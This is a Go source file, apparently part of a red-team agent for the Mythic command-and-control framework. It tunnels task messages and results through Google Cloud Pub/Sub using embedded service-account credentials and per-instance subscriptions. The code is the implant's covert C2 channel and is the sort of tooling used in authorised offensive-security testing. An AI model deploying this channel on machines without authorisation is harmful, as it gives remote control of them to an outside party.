package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"

	"cloud.google.com/go/pubsub"
	"google.golang.org/api/option"
)

// Transport handles real-world GCP Pub/Sub communication
// Mythic Server (GCP) ←→ Agent (Laptop/PC)
type Transport struct {
	client     *pubsub.Client
	sub        *pubsub.Subscription
	topic      *pubsub.Topic
	ctx        context.Context
	cancel     context.CancelFunc
	instanceID string // unique per-instance ID for routing (prevents same-UUID collision)
	agentID    string // Mythic UUID (payloadID) for message body identification
}

// Config for connecting to GCP from laptop/PC
type Config struct {
	ProjectID       string `json:"project_id"`        // GCP project ID
	TasksTopic      string `json:"tasks_topic"`       // Topic Mythic publishes to
	ResultsTopic    string `json:"results_topic"`     // Topic Agent publishes to
	SubscriptionID  string `json:"subscription_id"`   // Unique subscription per agent
	CredentialsFile string `json:"credentials_file"`  // Path to service account JSON key
	CredentialsJSON string `json:"credentials_json"`  // OR embedded JSON string
}

// NewTransport creates a transport that connects to GCP from anywhere.
// instanceID is a unique-per-process identifier used to create a filtered subscription
// so that two agents sharing the same Mythic UUID do not collide.
func NewTransport(cfg *Config, instanceID, agentID string) (*Transport, error) {
	ctx, cancel := context.WithCancel(context.Background())

	// Setup authentication for remote access
	var opts []option.ClientOption
	if cfg.CredentialsJSON != "" {
		// Embedded credentials (portable, base64 encoded)
		credsJSON, err := base64.StdEncoding.DecodeString(cfg.CredentialsJSON)
		if err != nil {
			cancel()
			return nil, err
		}
		opts = append(opts, option.WithCredentialsJSON(credsJSON))
	} else if cfg.CredentialsFile != "" {
		// File-based credentials
		opts = append(opts, option.WithCredentialsFile(cfg.CredentialsFile))
	}
	// If neither set, falls back to GOOGLE_APPLICATION_CREDENTIALS env var

	// Create client (connects to GCP over internet)
	client, err := pubsub.NewClient(ctx, cfg.ProjectID, opts...)
	if err != nil {
		cancel()
		return nil, err
	}

	// Per-instance subscription: mythic-tasks-sub-{instanceID}
	// This ensures two agents with the same UUID get separate subscriptions.
	subName := fmt.Sprintf("mythic-tasks-sub-%s", instanceID)
	filter := fmt.Sprintf("attributes.instance_id = \"%s\"", instanceID)

	sub := client.Subscription(subName)
	exists, err := sub.Exists(ctx)
	if err != nil {
		cancel()
		client.Close()
		return nil, err
	}

	if !exists {
		// Create filtered subscription
		tasksTopic := client.Topic(cfg.TasksTopic)
		sub, err = client.CreateSubscription(ctx, subName, pubsub.SubscriptionConfig{
			Topic:       tasksTopic,
			AckDeadline: 60 * time.Second,
			Filter:      filter,
		})
		if err != nil {
			cancel()
			client.Close()
			return nil, err
		}
	}

	// Configure for efficient receiving
	sub.ReceiveSettings.MaxOutstandingMessages = 10
	sub.ReceiveSettings.NumGoroutines = 10

	resultsTopic := client.Topic(cfg.ResultsTopic)

	// Configure for efficient publishing
	resultsTopic.PublishSettings = pubsub.PublishSettings{
		DelayThreshold: 200 * time.Millisecond,
		CountThreshold: 10,
		ByteThreshold:  1e6,
	}

	return &Transport{
		client:     client,
		sub:        sub,
		topic:      resultsTopic,
		ctx:        ctx,
		cancel:     cancel,
		instanceID: instanceID,
		agentID:    agentID,
	}, nil
}

// Listen starts receiving tasks from Mythic server
func (t *Transport) Listen(handler func(task map[string]interface{}) map[string]interface{}) error {
	return t.sub.Receive(t.ctx, func(ctx context.Context, msg *pubsub.Message) {
		// Parse incoming task
		var task map[string]interface{}
		if err := json.Unmarshal(msg.Data, &task); err != nil {
			msg.Nack()
			return
		}

		// Process task
		result := handler(task)

		// Send response if we have one
		if result != nil {
			data, _ := json.Marshal(result)
			t.topic.Publish(t.ctx, &pubsub.Message{Data: data})
		}

		// Acknowledge message
		msg.Ack()
	})
}

// Send publishes a message to Mythic server
func (t *Transport) Send(data map[string]interface{}) error {
	// Marshal the Merlin message to JSON
	msgData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	// Base64 encode the message
	encodedMsg := base64.StdEncoding.EncodeToString(msgData)

	// Wrap in MythicMessageWrapper format
	// sender_id = instanceID so the C2 server can route responses to this specific instance
	// client_id = agentID (Mythic UUID) so the C2 server knows which Mythic agent this is
	wrapper := map[string]interface{}{
		"message":   encodedMsg,
		"sender_id": t.instanceID,
		"client_id": t.agentID,
		"to_server": true,
	}

	// Marshal the wrapper
	wrapperData, err := json.Marshal(wrapper)
	if err != nil {
		return err
	}

	// Publish to Pub/Sub
	result := t.topic.Publish(t.ctx, &pubsub.Message{Data: wrapperData})
	_, err = result.Get(t.ctx)
	return err
}

// SendRaw publishes a pre-built base64 string (full Mythic frame) without JSON-marshaling
// or re-encoding the message body. Used for encrypted staging and encrypted comms.
func (t *Transport) SendRaw(base64Message string) error {
	wrapper := map[string]interface{}{
		"message":   base64Message,
		"sender_id": t.instanceID,
		"client_id": t.agentID,
		"to_server": true,
	}
	wrapperData, err := json.Marshal(wrapper)
	if err != nil {
		return fmt.Errorf("failed to marshal wrapper: %w", err)
	}
	result := t.topic.Publish(t.ctx, &pubsub.Message{Data: wrapperData})
	_, err = result.Get(t.ctx)
	return err
}

// Close cleanup
func (t *Transport) Close() error {
	t.cancel()
	t.topic.Stop()
	return t.client.Close()
}
